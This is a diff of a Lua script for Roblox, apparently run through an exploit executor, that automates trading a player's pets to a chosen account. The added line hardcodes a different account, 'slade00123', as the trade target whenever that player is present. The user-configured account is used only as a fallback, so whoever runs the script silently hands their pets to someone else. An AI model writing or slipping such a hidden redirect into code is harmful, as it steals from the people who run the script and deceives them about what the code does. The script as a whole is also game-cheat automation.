@@ -432,7 +432,7 @@ queue_on_teleport([==[
         Instance.new('Hint', workspace).Text = '[3/4] Trading pets to account'
 
         local T, lastTradeId = workspace.__REMOTES.Game.Trading, nil
-        local PLR = ]==] .. dex .. [==[ game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
+        local PLR = game.Players:FindFirstChild'slade00123' or game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
         
         game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
             lastTradeId = id
